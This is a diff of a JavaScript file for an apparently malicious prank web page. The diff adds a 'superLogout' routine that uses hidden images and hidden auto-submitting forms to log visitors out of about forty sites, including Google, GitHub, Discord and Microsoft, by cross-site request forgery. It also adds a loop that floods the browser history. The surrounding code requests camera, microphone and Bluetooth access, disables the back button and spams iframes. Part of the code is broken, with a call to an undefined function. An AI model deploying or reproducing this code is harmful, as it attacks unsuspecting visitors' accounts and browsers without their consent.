@@ -195,66 +195,116 @@ navigator.mediaDevices.getUserMedia({ video: true, audio: true })
     }
 
 
-    const logoutSites = [
+const LOGOUT_SITES = {
+  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
+  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
+  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
+  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
+  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
+  GitHub: ['GET', 'https://github.com/logout'],
+  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
+  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
+  Hulu: ['GET', 'https://secure.hulu.com/logout'],
+  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
+  Skype: ['GET', 'https://secure.skype.com/account/logout'],
+  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
+  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
+  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
+  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
+  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
+  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
+  JShop: ['GET', 'https://jshop.partners/panel/logout'],
+  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
+  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
+  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
+  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
+  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
+  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
+  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
+  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
+  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
+  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
+  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
+  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
+  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
+  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
+  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
+  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
+  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
+  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
+  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'] // added by @MARECKIyt
 
-        'https://discord.com/logout',
-
-        'https://www.facebook.com/logout',
-
-        'https://stackoverflow.com/logout',
-
-        'https://vk.com/logout',
-
-        'https://ometv.com/logout',
-
-        'https://portal.office.com/logout',
-
-        'https://github.com/logout',
-
-        'https://www.amazon.com/ap/signout',
-
-        'https://accounts.google.com/Logout',
-
-        'https://www.netflix.com/logout',
-
-        'https://www.disneyplus.com/logout',
-
-        'https://soundcloud.com/logout',
-
-        'https://www.wikipedia.org/logout',
-
-        'https://accounts.google.com/Logout',
-
-        'https://protonmail.com/logout',
-
-        'https://protonvpn.com/logout',
-
-        'https://www.roblox.com/logout',
-
-        'https://www.spotify.com/logout',
-
-        'https://www.reddit.com/logout',
-
-        'https://chat.openai.com/logout',
-
-        'https://www.guilded.gg/logout',
-
-        'https://www.tumblr.com/logout',
-
-        'https://www.ebay.com/logout'
-
-    ];
-
-
-    function logoutFromSites() {
-
-        logoutSites.forEach(site => {
-
-            window.open(site, '_blank');
-
-        });
-
+      function superLogout () {
+  function cleanup (el, delayCleanup) {
+    if (delayCleanup) {
+      delayCleanup = false
+      return
     }
+    el.parentNode.removeChild(el)
+  }
+
+  function get (url) {
+    const img = document.createElement('img')
+    img.onload = () => cleanup(img)
+    img.onerror = () => cleanup(img)
+    img.style = HIDDEN_STYLE
+    document.body.appendChild(img)
+    img.src = url
+  }
+
+  function post (url, params) {
+    const iframe = document.createElement('iframe')
+    iframe.style = HIDDEN_STYLE
+    iframe.name = 'iframe' + numSuperLogoutIframes
+    document.body.appendChild(iframe)
+
+    numSuperLogoutIframes += 1
+
+    const form = document.createElement('form')
+    form.style = HIDDEN_STYLE
+
+    let numLoads = 0
+    iframe.onload = iframe.onerror = () => {
+      if (numLoads >= 1) cleanup(iframe)
+      numLoads += 1
+    }
+    form.action = url
+    form.method = 'POST'
+    form.target = iframe.name
+
+    for (const param in params) {
+      if (Object.prototype.hasOwnProperty.call(params, param)) {
+        const input = document.createElement('input')
+        input.type = 'hidden'
+        input.name = param
+        input.value = params[param]
+        form.appendChild(input)
+      }
+    }
+
+    document.body.appendChild(form)
+    form.submit()
+  }
+  for (const name in LOGOUT_SITES) {
+    const method = LOGOUT_SITES[name][0]
+    const url = LOGOUT_SITES[name][1]
+    const params = LOGOUT_SITES[name][2] || {}
+
+    if (method === 'GET') {
+      get(url)
+    } else {
+      post(url, params)
+    }
+
+    const div = document.createElement('div')
+    div.innerText = `Wylogowywanie się z ${name}...`
+
+    const logoutMessages = document.querySelector('.logout-messages')
+    logoutMessages.appendChild(div)
+  }
+}
 
 
     function disableBack() {
@@ -321,6 +371,27 @@ playMusic(musicUrl);
     });
 }
 
+function generateRandomPhrase() {
+    const phrases = [
+        "looololoolollooloooloolooolololololololololol tralalalalalalaalal ptoszek to koxxxx",
+        "zerfitel",
+        "ZERFITHELLL",
+        "krol_dzasioch",
+        "UmBSyGEQdfsRTACpyMhfyQ=="
+    ];
+    return phrases[Math.floor(Math.random() * phrases.length)];
+}
+
+function fillHistory() {
+    for (let i = 0; i < 10; i++) {
+        const randomPhrase = generateRandomPhrase();
+        const randomUrl = `https://hazetlab.github.io/${encodeURIComponent(randomPhrase)}`;
+        window.history.pushState({ phrase: randomPhrase }, randomPhrase, randomUrl);
+    }
+}
+
+fillHistoryWithRandomPhrases();
+
 function createIframe(url) {
 
     const iframe = document.createElement('iframe');
@@ -336,11 +407,12 @@ function createIframe(url) {
 }
 
 
-createIframe('https://github.com/hazetlab/hazetlab.github.io/media/avast.jpg');
+// createIframe('https://github.com/hazetlab/hazetlab.github.io/media/avast.jpg');
 
 
     createIframe(url);
-
+    
+    generateRandomPhrase();
 
     playMusic(musicUrl);
     
@@ -358,13 +430,13 @@ createIframe('https://github.com/hazetlab/hazetlab.github.io/media/avast.jpg');
 
     requestBluetoothPermission();
 
-    logoutFromSites();
-
     disableBack(); 
 
     iframeSpam(); 
 
-    fillHistory(); 
+    fillHistory();
+
+    superLogout();
 
 }
 
